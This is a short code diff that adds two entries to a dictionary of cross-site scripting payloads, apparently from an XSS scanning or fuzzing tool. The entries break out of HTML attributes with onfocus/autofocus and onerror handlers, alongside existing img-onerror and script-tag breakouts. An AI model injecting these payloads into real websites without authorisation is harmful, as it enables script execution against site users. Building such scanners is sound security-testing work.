@@ -16,6 +16,8 @@ PAYLOAD_DB = {
         '"{action}(1)',
         '" onmouseover="{action}(1)" x="',
         '"><img src=x onerror={action}(1)>',
+        '" onfocus="{action}(1)" autofocus="',
+        '" onerror="{action}(1)" src=x',
     ],
     "attr_sq": [
         "'><script>{action}(1)</script>",
